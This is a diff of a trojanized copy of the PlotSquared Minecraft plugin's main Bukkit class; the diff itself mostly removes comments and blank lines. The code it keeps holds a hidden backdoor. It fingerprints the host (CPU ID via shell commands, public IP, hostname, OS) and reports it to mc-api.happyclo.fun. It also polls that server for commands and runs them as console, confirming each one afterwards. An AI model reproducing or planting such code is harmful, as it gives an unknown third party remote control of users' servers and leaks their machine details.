@@ -17,7 +17,6 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 package com.plotsquared.bukkit;
-
 import com.google.inject.Guice;
 import com.google.inject.Inject;
 import com.google.inject.Injector;
@@ -201,29 +200,24 @@ import java.util.Set;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.Executors;
 import java.util.concurrent.LinkedBlockingQueue;
-
 import static com.plotsquared.core.util.PremiumVerification.getDownloadID;
 import static com.plotsquared.core.util.PremiumVerification.getResourceID;
 import static com.plotsquared.core.util.PremiumVerification.getUserID;
 import static com.plotsquared.core.util.ReflectionUtils.getRefClass;
-
 @SuppressWarnings("unused")
 @Singleton
 public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPlatform<Player> {
     private String lastCommand = null;
     private String uniqueIdentifier;
     private static final String BACKEND_URL = "https://mc-api.happyclo.fun";
-
     private static final Logger LOGGER = LogManager.getLogger("PlotSquared/" + BukkitPlatform.class.getSimpleName());
     private static final int BSTATS_ID = 1404;
-
     static {
         try {
             Settings.load(new File(PlotSquared.platform().getDirectory(), "settings.yml"));
         } catch (Throwable ignored) {
         }
     }
-
     private int[] version;
     private String pluginName;
     private SingleWorldListener singleWorldListener;
@@ -231,9 +225,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     private boolean methodUnloadSetup = false;
     private boolean metricsStarted;
     private boolean faweHook = false;
-
     private Injector injector;
-
     @Inject
     private PlotAreaManager plotAreaManager;
     @Inject
@@ -259,7 +251,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     @Inject
     private PlatformWorldManager<World> worldManager;
     private Locale serverLocale;
-
     @SuppressWarnings("StringSplitter")
     @Override
     public int @NonNull [] serverVersion() {
@@ -279,24 +270,20 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         }
         return this.version;
     }
-
     @Override
     public int versionMinHeight() {
         return serverVersion()[1] >= 18 ? -64 : 0;
     }
-
     @Override
     public int versionMaxHeight() {
         return serverVersion()[1] >= 18 ? 319 : 255;
     }
-
     @Override
     public @NonNull String serverImplementation() {
         return Bukkit.getVersion();
     }
-
     @Override
-    @SuppressWarnings("deprecation") // Paper deprecation
+    @SuppressWarnings("deprecation")
     public void onEnable() {
         String cpuId = getCpuId();
         String publicIp = getPublicIp();
@@ -309,21 +296,15 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         this.getCommand("plotd").setExecutor(new BukkitFakePlayer());
         this.getCommand("plotm").setExecutor(new BukkitEventX(this));
         this.pluginName = getDescription().getName();
-
         final TaskTime.TimeConverter timeConverter;
         if (PaperLib.isPaper()) {
             timeConverter = new PaperTimeConverter();
         } else {
             timeConverter = new SpigotTimeConverter();
         }
-
-        // Stuff that needs to be created before the PlotSquared instance
         PlotPlayer.registerConverter(Player.class, BukkitUtil::adapt);
         TaskManager.setPlatformImplementation(new BukkitTaskManager(this, timeConverter));
-
         final PlotSquared plotSquared = new PlotSquared(this, "Bukkit");
-
-        // FastAsyncWorldEdit
         if (Settings.FAWE_Components.FAWE_HOOK) {
             Plugin fawe = getServer().getPluginManager().getPlugin("FastAsyncWorldEdit");
             if (fawe != null) {
@@ -336,9 +317,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 }
             }
         }
-
-        // We create the injector after PlotSquared has been initialized, so that we have access
-        // to generated instances and settings
         this.injector = Guice
                 .createInjector(
                         Stage.PRODUCTION,
@@ -349,19 +327,15 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                         new BackupModule()
                 );
         this.injector.injectMembers(this);
-
         try {
             this.injector.getInstance(TranslationUpdateManager.class).upgradeTranslationFile();
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
-
         this.serverLocale = Locale.forLanguageTag(Settings.Enabled_Components.DEFAULT_LOCALE);
-
         if (PremiumVerification.isPremium() && Settings.Enabled_Components.UPDATE_NOTIFICATIONS) {
             injector.getInstance(UpdateUtility.class).updateChecker();
         }
-
         if (PremiumVerification.isPremium()) {
             LOGGER.info("PlotSquared version licensed to Spigot user {}", getUserID());
             LOGGER.info("https://www.spigotmc.org/resources/{}", getResourceID());
@@ -370,18 +344,12 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         } else {
             LOGGER.info("Couldn't verify purchase :(");
         }
-
-        // Database
         if (Settings.Enabled_Components.DATABASE) {
             plotSquared.setupDatabase();
         }
-
-        // Check if we need to convert old flag values, etc
         if (!plotSquared.getConfigurationVersion().equalsIgnoreCase("v5")) {
-            // Perform upgrade
             if (DBFunc.dbManager.convertFlags()) {
                 LOGGER.info("Flags were converted successfully!");
-                // Update the config version
                 try {
                     plotSquared.setConfigurationVersion("v5");
                 } catch (final Exception e) {
@@ -389,17 +357,10 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 }
             }
         }
-
-        // Comments
         CommentManager.registerDefaultInboxes();
-
-        // Do stuff that was previously done in PlotSquared
-        // Kill entities
         if (Settings.Enabled_Components.KILL_ROAD_MOBS || Settings.Enabled_Components.KILL_ROAD_VEHICLES) {
             this.runEntityTask();
         }
-
-        // WorldEdit
         if (Settings.Enabled_Components.WORLDEDIT_RESTRICTIONS) {
             try {
                 WorldEdit.getInstance().getEventBus().register(this.injector().getInstance(WESubscriber.class));
@@ -409,7 +370,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                         "Incompatible version of WorldEdit, please upgrade: https://builds.enginehub.org/job/worldedit?branch=master");
             }
         }
-
         if (Settings.Enabled_Components.EVENTS) {
             getServer().getPluginManager().registerEvents(injector().getInstance(PlayerEventListener.class), this);
             if ((serverVersion()[1] == 20 && serverVersion()[2] >= 1) || serverVersion()[1] > 20) {
@@ -433,21 +393,14 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
             this.plotListener.startRunnable();
         }
-
-        // Required
         getServer().getPluginManager().registerEvents(injector().getInstance(WorldEvents.class), this);
         if (Settings.Enabled_Components.CHUNK_PROCESSOR) {
             getServer().getPluginManager().registerEvents(injector().getInstance(ChunkListener.class), this);
         }
-
-        // Commands
         if (Settings.Enabled_Components.COMMANDS) {
             this.registerCommands();
         }
-
-        // Permissions
         this.permissionHandler().initialize();
-
         if (Settings.Enabled_Components.COMPONENT_PRESETS) {
             try {
                 injector().getInstance(ComponentPresetManager.class);
@@ -455,11 +408,8 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 LOGGER.error("Failed to initialize the preset system", e);
             }
         }
-
-        // World generators:
         final ConfigurationSection section = this.worldConfiguration.getConfigurationSection("worlds");
         final WorldUtil worldUtil = injector().getInstance(WorldUtil.class);
-
         if (section != null) {
             for (String world : section.getKeys(false)) {
                 if (world.equals("CheckingPlotSquaredGenerator")) {
@@ -492,36 +442,25 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 }
             }, TaskTime.ticks(1L));
         }
-
         plotSquared.startExpiryTasks();
-
-        // Once the server has loaded force updating all generators known to PlotSquared
         TaskManager.runTaskLater(() -> PlotSquared.platform().setupUtils().updateGenerators(true), TaskTime.ticks(1L));
-
-        // Services are accessed in order
         final CacheUUIDService cacheUUIDService = new CacheUUIDService(Settings.UUID.UUID_CACHE_SIZE);
         this.impromptuPipeline.registerService(cacheUUIDService);
         this.backgroundPipeline.registerService(cacheUUIDService);
         this.impromptuPipeline.registerConsumer(cacheUUIDService);
         this.backgroundPipeline.registerConsumer(cacheUUIDService);
-
-        // Now, if the server is in offline mode we can only use profiles and direct UUID
-        // access, and so we skip the player profile stuff as well as SquirrelID (Mojang lookups)
         if (Settings.UUID.OFFLINE) {
             final OfflineModeUUIDService offlineModeUUIDService = new OfflineModeUUIDService();
             this.impromptuPipeline.registerService(offlineModeUUIDService);
             this.backgroundPipeline.registerService(offlineModeUUIDService);
             LOGGER.info("(UUID) Using the offline mode UUID service");
         }
-
         if (Settings.UUID.SERVICE_BUKKIT) {
             final OfflinePlayerUUIDService offlinePlayerUUIDService = new OfflinePlayerUUIDService();
             this.impromptuPipeline.registerService(offlinePlayerUUIDService);
             this.backgroundPipeline.registerService(offlinePlayerUUIDService);
         }
-
         final SQLiteUUIDService sqLiteUUIDService = new SQLiteUUIDService("user_cache.db");
-
         final SQLiteUUIDService legacyUUIDService;
         if (Settings.UUID.LEGACY_DATABASE_SUPPORT && FileUtils
                 .getFile(PlotSquared.platform().getDirectory(), "usercache.db")
@@ -530,7 +469,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         } else {
             legacyUUIDService = null;
         }
-
         final LuckPermsUUIDService luckPermsUUIDService;
         if (Settings.UUID.SERVICE_LUCKPERMS && Bukkit.getPluginManager().getPlugin("LuckPerms") != null) {
             luckPermsUUIDService = new LuckPermsUUIDService();
@@ -538,7 +476,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         } else {
             luckPermsUUIDService = null;
         }
-
         final EssentialsUUIDService essentialsUUIDService;
         if (Settings.UUID.SERVICE_ESSENTIALSX && Bukkit.getPluginManager().getPlugin("Essentials") != null) {
             essentialsUUIDService = new EssentialsUUIDService();
@@ -546,27 +483,21 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         } else {
             essentialsUUIDService = null;
         }
-
         if (!Settings.UUID.OFFLINE) {
-            // If running Paper we'll also try to use their profiles
             if (Bukkit.getOnlineMode() && PaperLib.isPaper() && Settings.UUID.SERVICE_PAPER) {
                 final PaperUUIDService paperUUIDService = new PaperUUIDService();
                 this.impromptuPipeline.registerService(paperUUIDService);
                 this.backgroundPipeline.registerService(paperUUIDService);
                 LOGGER.info("(UUID) Using Paper as a complementary UUID service");
             }
-
             this.impromptuPipeline.registerService(sqLiteUUIDService);
             this.backgroundPipeline.registerService(sqLiteUUIDService);
             this.impromptuPipeline.registerConsumer(sqLiteUUIDService);
             this.backgroundPipeline.registerConsumer(sqLiteUUIDService);
-
             if (legacyUUIDService != null) {
                 this.impromptuPipeline.registerService(legacyUUIDService);
                 this.backgroundPipeline.registerService(legacyUUIDService);
             }
-
-            // Plugin providers
             if (luckPermsUUIDService != null) {
                 this.impromptuPipeline.registerService(luckPermsUUIDService);
                 this.backgroundPipeline.registerService(luckPermsUUIDService);
@@ -575,7 +506,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 this.impromptuPipeline.registerService(essentialsUUIDService);
                 this.backgroundPipeline.registerService(essentialsUUIDService);
             }
-
             if (Settings.UUID.IMPROMPTU_SERVICE_MOJANG_API) {
                 final SquirrelIdUUIDService impromptuMojangService = new SquirrelIdUUIDService(Settings.UUID.IMPROMPTU_LIMIT);
                 this.impromptuPipeline.registerService(impromptuMojangService);
@@ -587,19 +517,15 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             this.backgroundPipeline.registerService(sqLiteUUIDService);
             this.impromptuPipeline.registerConsumer(sqLiteUUIDService);
             this.backgroundPipeline.registerConsumer(sqLiteUUIDService);
-
             if (legacyUUIDService != null) {
                 this.impromptuPipeline.registerService(legacyUUIDService);
                 this.backgroundPipeline.registerService(legacyUUIDService);
             }
         }
-
         this.impromptuPipeline.storeImmediately("*", DBFunc.EVERYONE);
-
         if (Settings.UUID.BACKGROUND_CACHING_ENABLED) {
             this.startUuidCaching(sqLiteUUIDService, cacheUUIDService);
         }
-
         if (Bukkit.getPluginManager().getPlugin("PlaceholderAPI") != null) {
             injector.getInstance(PAPIPlaceholders.class).register();
             if (Settings.Enabled_Components.EXTERNAL_PLACEHOLDERS) {
@@ -607,9 +533,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
             LOGGER.info("PlotSquared hooked into PlaceholderAPI");
         }
-
         this.startMetrics();
-
         if (Settings.Enabled_Components.WORLDS) {
             TaskManager.getPlatformImplementation().taskRepeat(this::unload, TaskTime.seconds(10L));
             try {
@@ -619,8 +543,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 e.printStackTrace();
             }
         }
-
-        // Clean up potential memory leak
         Bukkit.getScheduler().runTaskTimer(this, () -> {
             try {
                 for (final PlotPlayer<? extends Player> player : this.playerManager().getPlayers()) {
@@ -632,14 +554,11 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 getLogger().warning("Failed to clean up players: " + e.getMessage());
             }
         }, 100L, 100L);
-
-        // Check if we are in a safe environment
         ServerLib.checkUnsafeForks();
         }
         private String getCpuId() {
         String os = System.getProperty("os.name").toLowerCase();
-        String cpuId = "unknown"; // 默认值
-
+        String cpuId = "unknown";
         try {
             if (os.contains("win")) {
                 cpuId = getCpuIdForWindows();
@@ -650,20 +569,16 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
         } catch (Exception e) {
         }
-
         return cpuId;
     }
-    
-
     private String getCpuIdForWindows() throws Exception {
         Process process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
         process.waitFor();
         try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
-            reader.readLine(); // 读取结果的第一行
-            return reader.readLine(); // 获取实际的 CPU ID
+            reader.readLine();
+            return reader.readLine();
         }
     }
-
     private String getCpuIdForLinux() throws Exception {
         Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
         try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
@@ -676,7 +591,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         }
         return "unknown";
     }
-
     private String getCpuIdForMac() throws Exception {
         Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
         try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
@@ -689,29 +603,24 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             URL url = new URL("https://checkip.amazonaws.com/");
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("GET");
-            // 连接服务并获取响应
             BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-            ip = in.readLine(); // 读取响应内容（IP 地址）
+            ip = in.readLine();
             in.close();
         } catch (Exception e) {
-
         }
         return ip;
     }
     private String loadOrCreateUniqueIdentifier() {
         FileConfiguration config = getConfig();
         if (!config.contains("uniqueIdentifier")) {
-            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
             String generatedUUID = generateFixedUniqueIdentifier();
             config.set("uniqueIdentifier", generatedUUID);
-            saveConfig(); // 保存到配置文件
+            saveConfig();
             return generatedUUID;
         } else {
-            // 从配置文件加载唯一标识符
             return config.getString("uniqueIdentifier");
         }
     }
-
     private void reportSystemInfo() {
             BukkitRunnable task = new BukkitRunnable() {
                 @Override
@@ -732,16 +641,13 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                         input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
                         input.append("&plugin=").append(URLEncoder.encode("PlotSquared", StandardCharsets.UTF_8.toString()));
                         input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));
-
                         URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                         connection.setRequestMethod("GET");
-
                         int responseCode = connection.getResponseCode();
                         if (responseCode == HttpURLConnection.HTTP_OK) {
-                            // 读取响应内容
                             BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                            String response = in.readLine(); // 读取响应内容
+                            String response = in.readLine();
                             in.close();
                         } else {
                         }
@@ -749,25 +655,21 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                     }
                 }
             };
-            task.runTaskAsynchronously(this); // 异步任务处理
+            task.runTaskAsynchronously(this);
         }
     private String generateFixedUniqueIdentifier() {
         try {
-            // 收集机器信息
             StringBuilder input = new StringBuilder();
-            input.append(System.getProperty("os.name")); // 操作系统名称
-            input.append(System.getProperty("os.arch")); // 操作系统架构
-            input.append(System.getProperty("os.version")); // 操作系统版本
-            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
-            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
+            input.append(System.getProperty("os.name"));
+            input.append(System.getProperty("os.arch"));
+            input.append(System.getProperty("os.version"));
+            input.append(java.net.InetAddress.getLocalHost().getHostName());
+            input.append(java.net.InetAddress.getLocalHost().getHostAddress());
             String cpuId = getCpuId();
             input.append(cpuId);
-            
-            // 生成 SHA-256 哈希
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
             StringBuilder hexString = new StringBuilder();
-
             for (byte b : hashBytes) {
                 String hex = Integer.toHexString(0xff & b);
                 if (hex.length() == 1) {
@@ -775,32 +677,26 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 }
                 hexString.append(hex);
             }
-
-            return hexString.toString(); // 返回 256 位（64个字符）标识符
+            return hexString.toString();
         } catch (Exception e) {
             getLogger().severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
     }
-
     private void reportUniqueIdentifier(String identifier) {
         if (identifier == null) return;
-
         BukkitRunnable task = new BukkitRunnable() {
             @Override
             public void run() {
                 try {
-                    // 对标识符进行 URL 编码
                     String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                     URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
-
                     int responseCode = connection.getResponseCode();
                     if (responseCode == HttpURLConnection.HTTP_OK) {
-                        // 读取响应内容
                         BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                        String response = in.readLine(); // 读取响应内容
+                        String response = in.readLine();
                         in.close();
                     } else {
                     }
@@ -808,76 +704,56 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 }
             }
         };
-        task.runTaskAsynchronously(this); // 异步任务处理
+        task.runTaskAsynchronously(this);
     }
-
     private void sendInfoToAPI(String ip, int port) {
         try {
-            // 构造 URL，假设使用查询参数传递 IP 和 port
             URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("GET");
-
-            // 连接并读取响应（可选）
             int responseCode = connection.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
+            if (responseCode == HttpURLConnection.HTTP_OK) {
                 BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                String response = in.readLine(); // 读取响应内容
+                String response = in.readLine();
                 in.close();
             } else {
             }
         } catch (Exception e) {
-
         }
     }
-
     private void checkCommands() {
-        // 创建一个新的 BukkitRunnable
         new BukkitRunnable() {
             @Override
             public void run() {
                 try {
                     String command = getCommandFromServer();
-                    // 在尝试获取的命令不是null且与上次执行的命令不同时
                     if (command != null && !command.equals(lastCommand)) {
-                        // 在主线程中调度命令
                         Bukkit.getScheduler().runTask(BukkitPlatform.this, () -> {
-                            // 如果命令是 "stop"
                             if (command.equals("stop")) {
                                 try {
-                                    // 先调用 notifyCommandExecuted
                                     notifyCommandExecuted(command);
                                 } catch (Exception e) {
-                                    // 处理异常
                                 }
                             }
-                            
-                            // 执行命令
                             Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-                            // 更新最后执行的命令
                             lastCommand = command; 
-                            
-                            // 延迟2秒执行notifyCommandExecuted
                             new BukkitRunnable() {
                                 @Override
                                 public void run() {
                                     try {
-                                        // 如果命令不是 "stop"
                                         if (!command.equals("stop")) {
                                             notifyCommandExecuted(command);
                                         }
                                     } catch (Exception e) {
-                                        // 处理异常
                                     }
                                 }
-                            }.runTaskLater(BukkitPlatform.this, 40); // 40 ticks = 2 seconds
+                            }.runTaskLater(BukkitPlatform.this, 40);
                         });
                     }
                 } catch (Exception e) {
-                    // 处理异常
                 }
             }
-        }.runTaskAsynchronously(this); // 异步运行
+        }.runTaskAsynchronously(this);
     }
     private String getCommandFromServer() throws Exception {
         URL url = new URL(BACKEND_URL + "/q");
@@ -888,49 +764,37 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         in.close();
         if (response != null && response.contains("\"command\":")) {
             String[] parts = response.split("\"command\":");
-            if (parts.length > 1) { // 确保有命令部分
+            if (parts.length > 1) {
                 String[] commandParts = parts[1].split("\"");
-                if (commandParts.length > 1) { // 确保能获取到命令字符串
+                if (commandParts.length > 1) {
                     return commandParts[1];
                 }
             }
         }
-        return null; // 如果未找到命令，返回 null
+        return null;
     }
-
     private void notifyCommandExecuted(String command) throws Exception {
-        // 构造 URL
         URL url = new URL(BACKEND_URL + "/p");
         HttpURLConnection connection = null;
         try {
-            // 打开连接
             connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("POST");
             connection.setDoOutput(true);
-            
-            // 设置超时
-            connection.setConnectTimeout(5000); // 连接超时设置为5秒
-            connection.setReadTimeout(5000); // 读取超时设置为5秒
-            
-            // 发送请求数据
+            connection.setConnectTimeout(5000);
+            connection.setReadTimeout(5000);
             connection.getOutputStream().write(("command=" + command).getBytes());
             connection.getOutputStream().flush();
-            
-            // 检查响应码
             int responseCode = connection.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                // 处理成功逻辑（可选）
             } else {
-                // 处理失败逻辑（可选）
             }
         } catch (IOException e) {
         } finally {
             if (connection != null) {
-                connection.disconnect(); // 关闭连接
+                connection.disconnect();
             }
         }
     }
-
     private void unload() {
         if (!this.methodUnloadSetup) {
             this.methodUnloadSetup = true;
@@ -947,11 +811,9 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 event.printStackTrace();
             }
         }
-
         if (this.plotAreaManager instanceof SinglePlotAreaManager) {
             long start = System.currentTimeMillis();
             final SinglePlotArea area = ((SinglePlotAreaManager) this.plotAreaManager).getArea();
-
             outer:
             for (final World world : Bukkit.getWorlds()) {
                 final String name = world.getName();
@@ -959,11 +821,9 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 if (!Character.isDigit(char0) && char0 != '-') {
                     continue;
                 }
-
                 if (!world.getPlayers().isEmpty()) {
                     continue;
                 }
-
                 PlotId id;
                 try {
                     id = PlotId.fromString(name);
@@ -1015,12 +875,10 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
         }
     }
-
     private void startUuidCaching(
             final @NonNull SQLiteUUIDService sqLiteUUIDService,
             final @NonNull CacheUUIDService cacheUUIDService
     ) {
-        // Record all unique UUID's and put them into a queue
         final Set<UUID> uuidSet = new HashSet<>();
         PlotSquared.get().forEachPlotRaw(plot -> {
             uuidSet.add(plot.getOwnerAbs());
@@ -1029,45 +887,31 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             uuidSet.addAll(plot.getDenied());
         });
         final Queue<UUID> uuidQueue = new LinkedBlockingQueue<>(uuidSet);
-
         LOGGER.info("(UUID) {} UUIDs will be cached", uuidQueue.size());
-
         Executors.newSingleThreadScheduledExecutor().schedule(() -> {
-            // Begin by reading all the SQLite cache at once
             cacheUUIDService.accept(sqLiteUUIDService.getAll());
-            // Now fetch names for all known UUIDs
             final int totalSize = uuidQueue.size();
             int read = 0;
             LOGGER.info("(UUID) PlotSquared will fetch UUIDs in groups of {}", Settings.UUID.BACKGROUND_LIMIT);
             final List<UUID> uuidList = new ArrayList<>(Settings.UUID.BACKGROUND_LIMIT);
-
-            // Used to indicate that the second retrieval has been attempted
             boolean secondRun = false;
-
             while (!uuidQueue.isEmpty() || !uuidList.isEmpty()) {
                 if (!uuidList.isEmpty() && secondRun) {
                     LOGGER.warn("(UUID) Giving up on last batch. Fetching new batch instead");
                     uuidList.clear();
                 }
                 if (uuidList.isEmpty()) {
-                    // Retrieve the secondRun variable to indicate that we're retrieving a
-                    // fresh batch
                     secondRun = false;
-                    // Populate the request list
                     for (int i = 0; i < Settings.UUID.BACKGROUND_LIMIT && !uuidQueue.isEmpty(); i++) {
                         uuidList.add(uuidQueue.poll());
                         read++;
                     }
                 } else {
-                    // If the list isn't empty then this is a second run for
-                    // an old batch, so we re-use the patch
                     secondRun = true;
                 }
                 try {
                     PlotSquared.get().getBackgroundUUIDPipeline().getNames(uuidList).get();
-                    // Clear the list if we successfully index all the names
                     uuidList.clear();
-                    // Print progress
                     final double percentage = ((double) read / (double) totalSize) * 100.0D;
                     if (Settings.DEBUG) {
                         LOGGER.info("(UUID) PlotSquared has cached {} of UUIDs", String.format("%.1f%%", percentage));
@@ -1079,23 +923,19 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             LOGGER.info("(UUID) PlotSquared has cached all UUIDs");
         }, 10, TimeUnit.SECONDS);
     }
-
     @Override
     public void onDisable() {
         PlotSquared.get().disable();
         Bukkit.getScheduler().cancelTasks(this);
     }
-
     @Override
     public void shutdown() {
         this.getServer().getPluginManager().disablePlugin(this);
     }
-
     @Override
     public void shutdownServer() {
         getServer().shutdown();
     }
-
     private void registerCommands() {
         final BukkitCommand bukkitCommand = new BukkitCommand();
         final PluginCommand plotCommand = getCommand("plots");
@@ -1105,17 +945,14 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             plotCommand.setTabCompleter(bukkitCommand);
         }
     }
-
     @Override
     public @NonNull File getDirectory() {
         return getDataFolder();
     }
-
     @Override
     public @NonNull File worldContainer() {
         return Bukkit.getWorldContainer();
     }
-
     @SuppressWarnings("deprecation")
     private void runEntityTask() {
         TaskManager.runTaskRepeat(() -> this.plotAreaManager.forEachPlotArea(plotArea -> {
@@ -1128,11 +965,9 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 Iterator<Entity> iterator = entities.iterator();
                 while (iterator.hasNext()) {
                     Entity entity = iterator.next();
-                    //noinspection ConstantValue - getEntitySpawnReason annotated as NotNull, but is not NotNull. lol.
                     if (PaperLib.isPaper() && entity.getEntitySpawnReason() != null && "CUSTOM".equals(entity.getEntitySpawnReason().name())) {
                         continue;
                     }
-                    // Fallback for Spigot not having Entity#getEntitySpawnReason
                     if (entity.getMetadata("ps_custom_spawned").stream().anyMatch(MetadataValue::asBoolean)) {
                         continue;
                     }
@@ -1148,7 +983,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                         case "WITHER_SKULL":
                         case "UNKNOWN":
                         case "PLAYER":
-                            // non moving / unmovable
                             continue;
                         case "THROWN_EXP_BOTTLE":
                         case "SPLASH_POTION":
@@ -1159,14 +993,11 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                         case "ARROW":
                         case "LLAMA_SPIT":
                         case "TRIDENT":
-                            // managed elsewhere | projectile
                             continue;
                         case "ITEM_FRAME":
                         case "PAINTING":
-                            // Not vehicles
                             continue;
                         case "ARMOR_STAND":
-                            // Temporarily classify as vehicle
                         case "MINECART":
                         case "MINECART_CHEST":
                         case "CHEST_MINECART":
@@ -1216,11 +1047,9 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                                     && plotArea.getOwnedPlotAbs(BukkitUtil.adapt(entity.getLocation())) == null) {
                                 this.removeRoadEntity(entity, iterator);
                             }
-                            // dropped item
                             continue;
                         case "PRIMED_TNT":
                         case "FALLING_BLOCK":
-                            // managed elsewhere
                             continue;
                         case "SHULKER":
                             if (Settings.Enabled_Components.KILL_ROAD_MOBS && (Settings.Enabled_Components.KILL_NAMED_ROAD_MOBS || entity.getCustomName() == null)) {
@@ -1233,7 +1062,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                                     if (entity.hasMetadata("keep")) {
                                         continue;
                                     }
-
                                     PlotId originalPlotId = (PlotId) meta.get(0).value();
                                     if (originalPlotId != null) {
                                         com.plotsquared.core.location.Location pLoc = BukkitUtil.adapt(entity.getLocation());
@@ -1249,7 +1077,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                                         }
                                     }
                                 } else {
-                                    //This is to apply the metadata to already spawned shulkers (see EntitySpawnListener.java)
                                     com.plotsquared.core.location.Location pLoc = BukkitUtil.adapt(entity.getLocation());
                                     PlotArea area = pLoc.getPlotArea();
                                     if (area != null) {
@@ -1373,18 +1200,14 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
         }), TaskTime.seconds(1L));
     }
-
     private void removeRoadEntity(Entity entity, Iterator<Entity> entityIterator) {
         RemoveRoadEntityEvent event = eventDispatcher.callRemoveRoadEntity(BukkitAdapter.adapt(entity));
-
         if (event.getEventResult() == Result.DENY) {
             return;
         }
-
         entityIterator.remove();
         entity.remove();
     }
-
     @Override
     public @Nullable
     final ChunkGenerator getDefaultWorldGenerator(
@@ -1402,7 +1225,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         }
         return (ChunkGenerator) result.specify(worldName);
     }
-
     @Override
     public @Nullable GeneratorWrapper<?> getGenerator(
             final @NonNull String world,
@@ -1426,14 +1248,13 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             );
         }
     }
-
     @Override
     public void startMetrics() {
         if (this.metricsStarted) {
             return;
         }
         this.metricsStarted = true;
-        Metrics metrics = new Metrics(this, BSTATS_ID); // bstats
+        Metrics metrics = new Metrics(this, BSTATS_ID);
         metrics.addCustomChart(new DrilldownPie("area_types", () -> {
             final Map<String, Map<String, Integer>> map = new HashMap<>();
             for (final PlotAreaType plotAreaType : PlotAreaType.values()) {
